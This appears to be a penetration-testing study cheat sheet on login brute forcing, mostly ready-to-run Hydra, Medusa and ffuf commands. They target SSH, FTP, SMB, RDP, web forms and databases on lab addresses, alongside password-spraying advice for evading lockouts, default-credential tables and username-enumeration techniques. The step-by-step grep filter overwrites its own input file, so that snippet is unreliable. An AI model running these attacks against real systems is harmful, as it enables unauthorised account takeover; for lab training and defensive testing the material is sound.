# Login Brute Forcing

**Tags:** `#bruteforce` `#auth` `#authentication` `#hydra` `#medusa` `#passwords`

---

## Attack Types

| Method | Description | Best When |
|---|---|---|
| `Dictionary` | Tries passwords from a wordlist | Target likely uses weak/common passwords |
| `Brute Force` | Tries all character combinations | No info available, short passwords |
| `Hybrid` | Wordlist + mutations (append/prepend chars) | Target uses slightly modified common passwords |
| `Password Spraying` | Few passwords × many usernames | Lockout policy in place — avoid detection |
| `Credential Stuffing` | Leaked creds from breaches → other services | Target suspected of password reuse |
| `Rainbow Table` | Pre-computed hash → plaintext lookup | Large number of hashes to crack offline |

---

## Wordlists

| Wordlist | Description |
|---|---|
| `/usr/share/wordlists/rockyou.txt` | ~14M leaked passwords from RockYou breach |
| `/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt` | Top 200 common passwords |
| `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | Common usernames (quick) |
| `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` | 10M usernames (thorough) |
| `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` | Default device credentials |

---

## Custom Wordlist Generation

### cupp — target-specific password list

```bash
sudo apt install cupp -y
cupp -i        # interactive — prompts for target info (name, DOB, pet, etc.)
```

### Username Anarchy — username permutations

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Jane Smith > jane_smith_usernames.txt
./username-anarchy -i /path/to/firstlast_names.txt > usernames.txt
```

### CeWL — scrape keywords from website

```bash
cewl https://www.example.com -d 3 -m 5 -w cewl_wordlist.txt
```

### Filter Wordlist by Password Policy

```bash
# Download base list
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt

# Apply policy filters (chain with pipes or step by step)
grep -E '^.{8,}$' darkweb2017-top10000.txt > filtered.txt          # min 8 chars
grep -E '[A-Z]' filtered.txt > filtered.txt                          # must have uppercase
grep -E '[a-z]' filtered.txt > filtered.txt                          # must have lowercase
grep -E '[0-9]' filtered.txt > filtered.txt                          # must have digit
grep -E '([!@#$%^&*].*){2,}' filtered.txt > final_wordlist.txt      # 2+ special chars

# One-liner
grep -E '^.{8,}$' base.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > filtered.txt
```

---

## Hydra

### Syntax

```bash
hydra -l <user> -p <pass> <target> <service>
hydra -L users.txt -P passwords.txt <target> <service>
```

**Common flags:**

| Flag | Description |
|---|---|
| `-l` | Single username |
| `-L` | Username wordlist |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-C` | Colon-separated `user:pass` list |
| `-s` | Custom port |
| `-t` | Threads (default 16) |
| `-f` | Stop after first valid login |
| `-V` | Verbose — show each attempt |
| `-u` | Loop users before passwords (spray mode) |

### SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.x.x
hydra -L users.txt -P passwords.txt ssh://10.129.x.x -t 4
```

### FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.129.x.x
```

### SMB

```bash
hydra -L users.txt -P passwords.txt smb://10.129.x.x
```

### RDP

```bash
hydra -L users.txt -P passwords.txt rdp://10.129.x.x -t 4
```

### HTTP Basic Auth

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.x.x http-get /protected/
```

Basic Auth header decoded: `Authorization: Basic YWxpY2U6c2VjcmV0` → `alice:secret` (base64)

### HTTP POST Form

```bash
# Syntax: http-post-form "/path:param1=^USER^&param2=^PASS^:F=<failure_string>"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.x.x http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

# With cookie
hydra -l admin -P passwords.txt 10.129.x.x http-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed:H=Cookie: session=abc123"
```

### HTTP GET Form

```bash
hydra -l admin -P passwords.txt 10.129.x.x http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

### MySQL / MSSQL / PostgreSQL

```bash
hydra -l root -P passwords.txt mysql://10.129.x.x
hydra -l sa -P passwords.txt mssql://10.129.x.x
hydra -l postgres -P passwords.txt postgres://10.129.x.x
```

### Password Spraying (avoid lockouts)

```bash
# -u loops usernames before moving to next password — better for spraying
hydra -L users.txt -P top_passwords.txt 10.129.x.x ssh -u -f
```

---

## Medusa

```bash
# Syntax
medusa -h <host> -u <user> -P <passlist> -M <module>

# SSH
medusa -h 10.129.x.x -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# FTP
medusa -h 10.129.x.x -u admin -P passwords.txt -M ftp

# HTTP Basic Auth
medusa -h 10.129.x.x -u admin -P passwords.txt -M http -m GET:/protected/

# HTTP POST Form
medusa -h 10.129.x.x -u admin -P passwords.txt -M web-form \
  -m "FORM:username=&password=:FAIL=Invalid"

# SMB
medusa -h 10.129.x.x -U users.txt -P passwords.txt -M smbnt
```

**Common flags:**

| Flag | Description |
|---|---|
| `-h` | Target host |
| `-H` | Host file |
| `-u` | Single username |
| `-U` | Username file |
| `-p` | Single password |
| `-P` | Password file |
| `-M` | Module (service) |
| `-m` | Module-specific options |
| `-t` | Threads |
| `-f` | Stop after first success |

---

## Default Credentials

```bash
# Try known defaults before brute forcing
# https://github.com/ihebski/DefaultCreds-cheat-sheet
# /usr/share/seclists/Passwords/Default-Credentials/

hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt 10.129.x.x http-get /
```

Common defaults to try manually:

| Service | Common Defaults |
|---|---|
| Routers | `admin:admin`, `admin:password`, `admin:` |
| Tomcat | `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` |
| Jenkins | `admin:admin`, `admin:password` |
| IPMI | `ADMIN:ADMIN` |
| Printers | `admin:admin`, `admin:1234` |
| MySQL | `root:` (empty), `root:root` |

---

## Web Application Notes

### Identifying Login Failure String

Intercept with Burp or curl to get the failure response, then use that string as the failure indicator in Hydra/Medusa:

```bash
curl -s -X POST http://10.129.x.x/login -d "username=baduser&password=badpass" | grep -i "error\|invalid\|fail"
```

### Username Enumeration via Response Differences

- Different HTTP response codes for valid vs invalid users
- Different response times
- Different error messages ("User not found" vs "Wrong password")

```bash
# If different response length for valid user:
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -X POST -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.129.x.x/login \
  -fs <invalid_size>
```

### Brute Force After Username Enumeration

```bash
ffuf -w passwords.txt \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.129.x.x/login \
  -fs <failure_size>
```
